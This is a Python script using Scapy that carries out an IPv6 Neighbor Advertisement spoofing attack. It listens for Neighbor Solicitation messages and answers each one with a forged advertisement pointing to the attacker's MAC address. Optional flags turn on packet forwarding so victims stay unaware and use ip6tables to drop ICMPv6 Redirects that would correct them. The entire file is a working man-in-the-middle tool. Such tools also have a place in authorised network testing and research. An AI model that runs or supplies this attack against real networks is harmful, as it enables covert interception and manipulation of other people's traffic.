#!/usr/bin/python3
import argparse
import logging
import os
import sys
from collections import Counter

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, sendp

from validate_parameters import is_valid_mac


def main():
    parser = argparse.ArgumentParser(description="Spoofing every Neighbor Solicitation message by a fake Neighbor "
                                                 "Advertisement message (similar to ARP spoofing in IPv4).")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-tmac", dest="target_mac", action="store",
                        help="the fake MAC address (resolved from network interface when skipping)")
    parser.add_argument("-R", dest="r_flag", action="store_true", default=False,
                        help="the R flag (Router)")
    parser.add_argument("-S", dest="s_flag", action="store_true", default=False, help="the S flag (Solicited)")
    parser.add_argument("-O", dest="o_flag", action="store_true", default=False,
                        help="the O flag (Override)")
    parser.add_argument("-fwd", dest="forward", action="store_true", default=False, help="the option to forward "
                                                                                         "traffic through attacker")
    parser.add_argument("-re", dest="redirect_drop", action="store_true", default=False,
                        help="the option to not allow attacker to send Redirect for telling victim to use correct MAC "
                             "address")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target MAC address
    if args.target_mac is None:
        args.target_mac = get_if_hwaddr(args.interface)
    if args.target_mac is not None:
        if not is_valid_mac(args.target_mac):
            print("---> The given target MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the R flag
    if not args.r_flag:
        args.r_flag = 0
    if args.r_flag:
        args.r_flag = 1

    # Validate the S flag
    if not args.s_flag:
        args.s_flag = 0
    if args.s_flag:
        args.s_flag = 1

    # Validate the O flag
    if not args.o_flag:
        args.o_flag = 0
    if args.o_flag:
        args.o_flag = 1

    # Validate the option forwarding and dropping Redirect messages
    if args.forward:
        # Forward all packets to its real destination to stay undetected by end-users
        command = 'sysctl -w net.ipv6.conf.all.forwarding=1'
        os.system(command)
        print("........................................................................................")

    if args.redirect_drop:
        command = 'ip6tables -A OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP'
        os.system(command)
        print('ip6tables -A OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP')
        print("........................................................................................")

    # Define our Custom Action function
    packet_counts = Counter()
    my_iplist = ["::"]
    for i in range(len(netifaces.ifaddresses(args.interface)[netifaces.AF_INET6])):
        source_ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET6][i]['addr']
        source_ip = source_ip.replace("%", '')
        source_ip = source_ip.replace(args.interface, '')
        my_iplist.append(source_ip)
    
    def custom_action(packet):
        if packet[0][1].src not in my_iplist:
            # Create tuple of Src/Dst in sorted order
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            # Generating packet
            layer2 = Ether(src=args.target_mac, dst=packet[0].src)
            layer3 = IPv6(src=packet[0][ICMPv6ND_NS].tgt, dst=packet[0][1].src)
            packet1 = layer2 / layer3 / ICMPv6ND_NA(R=args.r_flag, S=args.s_flag, O=args.o_flag,
                                                    tgt=packet[0][ICMPv6ND_NS].tgt) / ICMPv6NDOptDstLLAddr(
                lladdr=args.target_mac)
            sendp(packet1, verbose=False, iface=args.interface)
            return f"+ Spoofing to the host: {packet[0][1].src}\n   as pretending to be: " \
                   f"{packet[0][ICMPv6ND_NS].tgt}"

    # Setup sniff, filtering for IP traffic to see the result
    print("Initializing Neighbor Advertisement spoof attack (press Ctrl+C to stop the process).....")

    build_filter = "icmp6 and ip6[40] == 135"

    try:
        sniff(iface=args.interface, filter=build_filter, prn=custom_action)
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    main()
